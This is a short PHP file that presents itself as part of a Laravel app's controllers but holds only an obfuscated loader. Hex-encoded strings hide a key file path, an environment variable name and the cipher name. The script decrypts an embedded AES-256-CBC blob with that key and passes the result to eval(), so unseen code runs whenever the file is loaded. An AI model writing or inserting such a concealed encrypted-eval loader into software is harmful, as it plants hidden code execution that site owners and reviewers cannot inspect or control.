<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('AzxNFKgaITSTsDC4v9p3wg==');
$c=base64_decode(
'WeHne75inaSjmhOvKap0ShhGA5pfxEZrKrBNHT3y8pNSlPnQzMsDoA77t/3ZSEJUiMyO+fThGbMI' .
'Km16hsgC1+V4iTfC/OuvJY7i7TDPNof6JsRGLAdZWMc457Be+grVTe9K+nlrsH4z+4PEjjLmWKMt' .
'm3sMd2v+vowudkx0lffmfHE62BeSIsjWISbW9kF6jbTAymq2p8QiA18Yg1lSyY/kOOYoR9tLnFLu' .
'0wHkbvR2OnY6A8VT7dKCDB8eJHvMfuB9f1ecBY3q6eJx1vVzT/oHxzdSBcVlJjKsjDdcA6FxxSOC' .
'dLklEoLaCOJxzep7lhYeYSl4kG8Kw21+7CToIOPAL3srSHIGRTP963zv7G22EWQYyVL7VcEcvRQB' .
'QHRwRO+xcBZr7cJVI+TfsNadPQ=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
